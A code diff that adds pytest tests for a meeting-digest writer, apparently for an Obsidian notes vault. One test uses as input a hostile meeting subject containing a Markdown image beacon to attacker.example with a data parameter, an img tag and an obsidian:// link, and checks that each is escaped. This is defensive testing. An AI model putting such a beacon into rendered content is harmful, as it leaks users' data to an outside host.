@@ -58,3 +58,45 @@ def test_overlap_reason_counts_people_not_addresses(vault: Path) -> None:
     assert not unmatched
     assert [(p.stem, p.confidence) for p in props] == [("Pair", "overlap")]
     assert props[0].why == "2/2 attendees overlap"
+
+
+# ---- the digest (F-20261020 5268559, 5278121) -------------------------------
+
+class _NoGroups:
+    def match(self, subject, emails):
+        return None
+
+
+def _adhoc(tmp_path: Path, stem: str, subject: str):
+    from types import SimpleNamespace
+    return SimpleNamespace(type="Ad-hoc", title=subject, title_plain=subject,
+                           people=["[[A]]", "[[B]]"], path=tmp_path / f"{stem}.md")
+
+
+def _digest(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, subjects: list) -> str:
+    monkeypatch.setattr(bf, "_MP", mp)
+    notes = [_adhoc(tmp_path, f"2026-10-0{i + 1} m", s) for i, s in enumerate(subjects)]
+    return bf.write_digest(notes, _NoGroups(), apply_=False)
+
+
+def test_digest_subject_cannot_load_an_image_or_carry_markup(tmp_path, monkeypatch):
+    evil = "Sync ![x](https://attacker.example/p.png?d=1) <img src=x> [o](obsidian://open) #task `x` **b**"
+    text = _digest(tmp_path, monkeypatch, [evil])
+    line = next(l for l in text.splitlines() if l.startswith("- **"))
+    assert "![" not in line and "<img" not in line and "obsidian://" not in line
+    assert "\\#task" in line and "\\`x\\`" in line and "\\*\\*b\\*\\*" in line
+    assert line.startswith("- **Sync \\!\u200b\\[x\\]\\(https://attacker.example/p.png?d\\=1\\) \\<\u200bimg")
+
+
+def test_recurring_subject_variants_are_not_in_a_code_span(tmp_path, monkeypatch):
+    subs = ["Weekly sync secret", "Weekly sync secret", "Sync weekly `]] [[Secret"]
+    text = _digest(tmp_path, monkeypatch, subs)
+    variants = next(l for l in text.splitlines() if l.startswith("Subject variants seen:"))
+    assert "`" not in variants.replace("\\`", "")
+    assert "\\]\\] \\[\\[Secret" in variants
+
+
+def test_digest_is_classified_as_its_meeting_sources(tmp_path, monkeypatch):
+    text = _digest(tmp_path, monkeypatch, ["Weekly sync", "Other"])
+    assert "\nclassification: confidential\n" in text
+    assert "internal-use-only" not in text
